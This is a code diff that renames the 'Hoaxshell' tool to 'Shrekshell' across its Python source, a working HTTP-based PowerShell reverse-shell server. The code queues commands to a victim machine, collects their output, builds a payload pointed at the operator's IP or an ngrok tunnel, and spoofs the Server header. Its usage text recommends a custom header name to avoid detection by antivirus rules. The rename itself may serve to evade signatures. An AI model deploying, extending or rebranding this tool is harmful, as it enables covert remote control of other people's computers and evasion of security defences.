@@ -45,7 +45,7 @@ Usage examples:
       
   - Recommended usage to avoid detection (over http):
 	  
-     # Hoaxshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. 
+     # Shrekshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. 
      # Use -H to provide a standard or custom http header name to avoid detection.
      sudo python3 shrekshell.py -s <your_ip> -i -H "Authorization"
      
@@ -80,7 +80,7 @@ parser.add_argument("-k", "--keyfile", action="store", help = "Path to the priva
 parser.add_argument("-p", "--port", action="store", help = "Your shrekshell server port (default: 8080 over http, 443 over https).", type = int)
 parser.add_argument("-f", "--frequency", action="store", help = "Frequency of cmd execution queue cycle (A low value creates a faster shell but produces more http traffic. *Less than 0.8 will cause trouble. default: 0.8s).", type = float)
 parser.add_argument("-i", "--invoke-restmethod", action="store_true", help = "Generate payload using the 'Invoke-RestMethod' instead of the default 'Invoke-WebRequest' utility.")
-parser.add_argument("-H", "--Header", action="store", help = "Hoaxshell utilizes a non-standard header to transfer the session id between requests. A random name is given to that header by default. Use this option to set a custom header name.")
+parser.add_argument("-H", "--Header", action="store", help = "Shrekshell utilizes a non-standard header to transfer the session id between requests. A random name is given to that header by default. Use this option to set a custom header name.")
 parser.add_argument("-x", "--exec-outfile", action="store", help = "Provide a filename (absolute path) on the victim machine to write and execute commands from instead of using \"Invoke-Expression\". The path better be quoted. Be careful when using special chars in the path (e.g. $env:USERNAME) as they must be properly escaped. See usage examples for details. CAUTION: you won't be able to change directory with this method. Your commands must include ablsolute paths to files etc.")
 parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded.")
 parser.add_argument("-v", "--server-version", action="store", help = "Provide a value for the \"Server\" response header (default: Apache/2.4.1)")
@@ -190,14 +190,14 @@ def checkPulse(stop_event):
 		timestamp = int(datetime.now().timestamp())
 		tlimit = frequency + 10
 
-		if Hoaxshell.execution_verified and Hoaxshell.prompt_ready:
-			if abs(Hoaxshell.last_received - timestamp) > tlimit:
+		if Shrekshell.execution_verified and Shrekshell.prompt_ready:
+			if abs(Shrekshell.last_received - timestamp) > tlimit:
 				print(f'\r[{WARN}] Session has been idle for more than {tlimit} seconds. Shell probably died.')
-				Hoaxshell.prompt_ready = True
+				Shrekshell.prompt_ready = True
 				stop_event.set()
 
 		else:
-			Hoaxshell.last_received = timestamp
+			Shrekshell.last_received = timestamp
 			
 		sleep(5)
 
@@ -217,9 +217,9 @@ t_process = None
 
 def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):
 
-	if Hoaxshell.rst_promt_required or force_rst:
+	if Shrekshell.rst_promt_required or force_rst:
 		sys.stdout.write(prefix + prompt + readline.get_line_buffer())
-		Hoaxshell.rst_promt_required = False
+		Shrekshell.rst_promt_required = False
 
 
 # -------------- Tunneling Server -------------- #
@@ -297,8 +297,8 @@ class Tunneling:
 		print(f'\r[{WARN}] Tunnel terminated.')
 
 
-# -------------- Hoaxshell Server -------------- #
-class Hoaxshell(BaseHTTPRequestHandler):
+# -------------- Shrekshell Server -------------- #
+class Shrekshell(BaseHTTPRequestHandler):
 
 	restored = False
 	rst_promt_required = False
@@ -319,73 +319,73 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	def do_GET(self):
 
 		timestamp = int(datetime.now().timestamp())
-		Hoaxshell.last_received = timestamp
+		Shrekshell.last_received = timestamp
 
-		if args.grab and not Hoaxshell.restored:
+		if args.grab and not Shrekshell.restored:
 			if not args.Header:
 				header_id = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
-				Hoaxshell.header_id = f'X-{header_id[0]}'
+				Shrekshell.header_id = f'X-{header_id[0]}'
 			else:
-				Hoaxshell.header_id = args.Header
+				Shrekshell.header_id = args.Header
 				
-			session_id = self.headers.get(Hoaxshell.header_id)
+			session_id = self.headers.get(Shrekshell.header_id)
 			
 			if len(session_id) == 26:
 				h = session_id.split('-')
-				Hoaxshell.verify = h[0]
-				Hoaxshell.get_cmd = h[1]
-				Hoaxshell.post_res = h[2]
-				Hoaxshell.SESSIONID = session_id
-				Hoaxshell.restored = True
-				Hoaxshell.execution_verified = True
+				Shrekshell.verify = h[0]
+				Shrekshell.get_cmd = h[1]
+				Shrekshell.post_res = h[2]
+				Shrekshell.SESSIONID = session_id
+				Shrekshell.restored = True
+				Shrekshell.execution_verified = True
 				session_check = Thread(target = checkPulse, args = (stop_event,))
 				session_check.daemon = True
 				session_check.start()
 
 				print(f'\r[{GREEN}Shell{END}] {BOLD}Session restored!{END}')
-				Hoaxshell.rst_promt_required = True
+				Shrekshell.rst_promt_required = True
 
-		self.server_version = Hoaxshell.server_version
+		self.server_version = Shrekshell.server_version
 		self.sys_version = ""
-		session_id = self.headers.get(Hoaxshell.header_id)
-		legit = True if session_id == Hoaxshell.SESSIONID else False
+		session_id = self.headers.get(Shrekshell.header_id)
+		legit = True if session_id == Shrekshell.SESSIONID else False
 
 		# Verify execution
-		if self.path == f'/{Hoaxshell.verify}' and legit:
+		if self.path == f'/{Shrekshell.verify}' and legit:
 
 			self.send_response(200)
 			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
 			self.send_header('Access-Control-Allow-Origin', '*')
 			self.end_headers()
 			self.wfile.write(bytes('OK', "utf-8"))
-			Hoaxshell.execution_verified = True
+			Shrekshell.execution_verified = True
 			session_check = Thread(target = checkPulse, args = (stop_event,))
 			session_check.daemon = True
 			session_check.start()
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execution verified!{END}')
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}') #end = ''
 			print(f'\r[{IMPORTANT}] You can\'t change dir while utilizing --exec-outfile (-x) option. Your commands must include absolute paths to files, etc.') if args.exec_outfile else chill()
-			Hoaxshell.prompt_ready = False
-			Hoaxshell.command_pool.append(f"echo `r;pwd")
-			Hoaxshell.rst_promt_required = True
+			Shrekshell.prompt_ready = False
+			Shrekshell.command_pool.append(f"echo `r;pwd")
+			Shrekshell.rst_promt_required = True
 
 
 		# Grab cmd
-		if self.path == f'/{Hoaxshell.get_cmd}' and legit and Hoaxshell.execution_verified:
+		if self.path == f'/{Shrekshell.get_cmd}' and legit and Shrekshell.execution_verified:
 
 			self.send_response(200)
 			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
 			self.send_header('Access-Control-Allow-Origin', '*')
 			self.end_headers()
 
-			if len(Hoaxshell.command_pool):
-				cmd = Hoaxshell.command_pool.pop(0)
+			if len(Shrekshell.command_pool):
+				cmd = Shrekshell.command_pool.pop(0)
 				self.wfile.write(bytes(cmd, "utf-8"))
 
 			else:
 				self.wfile.write(bytes('None', "utf-8"))
 
-			Hoaxshell.last_received = timestamp
+			Shrekshell.last_received = timestamp
 
 		else:
 			self.send_response(200)
@@ -398,14 +398,14 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	def do_POST(self):
 		global prompt
 		timestamp = int(datetime.now().timestamp())
-		Hoaxshell.last_received = timestamp
-		self.server_version = Hoaxshell.server_version
+		Shrekshell.last_received = timestamp
+		self.server_version = Shrekshell.server_version
 		self.sys_version = ""
-		session_id = self.headers.get(Hoaxshell.header_id)
-		legit = True if session_id == Hoaxshell.SESSIONID else False
+		session_id = self.headers.get(Shrekshell.header_id)
+		legit = True if session_id == Shrekshell.SESSIONID else False
 
 		# cmd output
-		if self.path == f'/{Hoaxshell.post_res}' and legit and Hoaxshell.execution_verified:
+		if self.path == f'/{Shrekshell.post_res}' and legit and Shrekshell.execution_verified:
 
 			try:
 				self.send_response(200)
@@ -428,17 +428,17 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
 						output = output.rsplit("Drive", 1)[0] if junk else output
 						
-						if Hoaxshell.init_dir == None:
+						if Shrekshell.init_dir == None:
 							p = tmp[-1].strip().rsplit("\n")[-1]
 							p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
-							Hoaxshell.init_dir = p
+							Shrekshell.init_dir = p
 													
 						if not args.exec_outfile:						
 							p = tmp[-1].strip().rsplit("\n")[-1]
 							p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
 							
 						else:
-							p = Hoaxshell.init_dir
+							p = Shrekshell.init_dir
 							
 						prompt = f"PS {p} > "
 
@@ -460,7 +460,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				print(f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try redirecting the command\'s output to a file and transfering it to your machine.')
 
 			rst_prompt(prompt = prompt)
-			Hoaxshell.prompt_ready = True
+			Shrekshell.prompt_ready = True
 
 		else:
 			self.send_response(200)
@@ -472,13 +472,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 	def do_OPTIONS(self):
 
-		self.server_version = Hoaxshell.server_version
+		self.server_version = Shrekshell.server_version
 		self.sys_version = ""
 		self.send_response(200)
 		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
 		self.send_header('Vary', "Origin")
 		self.send_header('Access-Control-Allow-Credentials', 'true')
-		self.send_header('Access-Control-Allow-Headers', Hoaxshell.header_id)
+		self.send_header('Access-Control-Allow-Headers', Shrekshell.header_id)
 		self.end_headers()
 		self.wfile.write(b'OK')
 
@@ -495,9 +495,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			t_process.terminate()
 		
 		if not args.exec_outfile:
-			Hoaxshell.command_pool.append('exit')
+			Shrekshell.command_pool.append('exit')
 		else:
-			Hoaxshell.command_pool.append(f'del {args.exec_outfile};exit')	
+			Shrekshell.command_pool.append(f'del {args.exec_outfile};exit')	
 			
 		sleep(frequency + 2.0)
 		print(f'[{WARN}] Session terminated.')
@@ -507,8 +507,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 	def terminate():
 
-			if Hoaxshell.execution_verified:
-				Hoaxshell.dropSession()
+			if Shrekshell.execution_verified:
+				Shrekshell.dropSession()
 
 			else:
 				if t_process:
@@ -605,7 +605,7 @@ def main():
 				t_server = t_process.ngrok_address()
 
 		try:
-			httpd = HTTPServer(('0.0.0.0', server_port), Hoaxshell)
+			httpd = HTTPServer(('0.0.0.0', server_port), Shrekshell)
 
 		except OSError:
 			exit(f'\n[{FAILED}] - {BOLD}Port {server_port} seems to already be in use.{END}\n')
@@ -622,9 +622,9 @@ def main():
 
 		port = f':{server_port}' if server_port != 443 else ''
 
-		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
-		Hoaxshell_server.daemon = True
-		Hoaxshell_server.start()
+		Shrekshell_server = Thread(target = httpd.serve_forever, args = ())
+		Shrekshell_server.daemon = True
+		Shrekshell_server.start()
 	
 		
 		# Generate payload
@@ -650,8 +650,8 @@ def main():
 			
 			payload = source.read().strip()
 			source.close()
-			payload = payload.replace('*SERVERIP*', (t_server if (args.localtunnel or args.ngrok) else server_ip)).replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(
-				frequency)).replace('*VERIFY*', Hoaxshell.verify).replace('*GETCMD*', Hoaxshell.get_cmd).replace('*POSTRES*', Hoaxshell.post_res).replace('*HOAXID*', Hoaxshell.header_id)
+			payload = payload.replace('*SERVERIP*', (t_server if (args.localtunnel or args.ngrok) else server_ip)).replace('*SESSIONID*', Shrekshell.SESSIONID).replace('*FREQ*', str(
+				frequency)).replace('*VERIFY*', Shrekshell.verify).replace('*GETCMD*', Shrekshell.get_cmd).replace('*POSTRES*', Shrekshell.post_res).replace('*HOAXID*', Shrekshell.header_id)
 			
 			if args.invoke_restmethod:
 				payload = payload.replace("Invoke-WebRequest", "Invoke-RestMethod").replace(".Content", "")		
@@ -677,7 +677,7 @@ def main():
 		# Command prompt
 		while True:
 
-			if Hoaxshell.prompt_ready:
+			if Shrekshell.prompt_ready:
 
 				user_input = input(prompt).strip()
 
@@ -694,21 +694,21 @@ def main():
 					print(f'{PLOAD}{payload}{END}')
 
 				elif user_input.lower() in ['exit', 'quit', 'q']:
-					Hoaxshell.terminate()
+					Shrekshell.terminate()
 
 				elif user_input == '':
 					rst_prompt(force_rst = True, prompt = '\r')
 
 				else:
 
-					if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
+					if Shrekshell.execution_verified and not Shrekshell.command_pool:
 						
 						if user_input == "pwd": user_input = "split-path $pwd'\\0x00'"
 							
-						Hoaxshell.command_pool.append(user_input + f";pwd")
-						Hoaxshell.prompt_ready = False
+						Shrekshell.command_pool.append(user_input + f";pwd")
+						Shrekshell.prompt_ready = False
 
-					elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
+					elif Shrekshell.execution_verified and Shrekshell.command_pool:
 						pass
 
 					else:
@@ -718,7 +718,7 @@ def main():
 
 
 	except KeyboardInterrupt:
-		Hoaxshell.terminate()
+		Shrekshell.terminate()
 
 
 if __name__ == '__main__':
